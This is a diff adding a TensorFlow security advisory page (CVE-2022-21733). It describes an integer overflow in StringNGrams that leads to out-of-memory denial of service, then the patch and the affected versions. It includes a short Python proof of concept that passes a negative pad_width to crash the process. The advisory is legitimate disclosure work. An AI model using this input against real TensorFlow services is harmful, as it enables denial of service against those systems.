@@ -1,0 +1,25 @@
+<h2>TFSA-2022-009: OOM due to integer overflow in <code>StringNGrams</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-21733</p>
+<h3>Impact</h3>
+<p>The <a href="https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/string_ngrams_op.cc#L29-L161">implementation of <code>StringNGrams</code></a> can be used to trigger a denial of service attack by causing an OOM condition after an integer overflow:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.raw_ops.StringNGrams(
+  data=['123456'],
+  data_splits=[0,1],
+  separator='a'*15,
+  ngram_widths=[],
+  left_pad='',
+  right_pad='',
+  pad_width=-5,
+  preserve_short_sequences=True)
+```</p>
+<p>We are missing a validation on <code>pad_witdh</code> and that result in computing a negative value for <code>ngram_width</code> which is later used to allocate parts of the output.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f68fdab93fb7f4ddb4eb438c8fe052753c9413e8">f68fdab93fb7f4ddb4eb438c8fe052753c9413e8</a>.</p>
+<p>The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.</p>
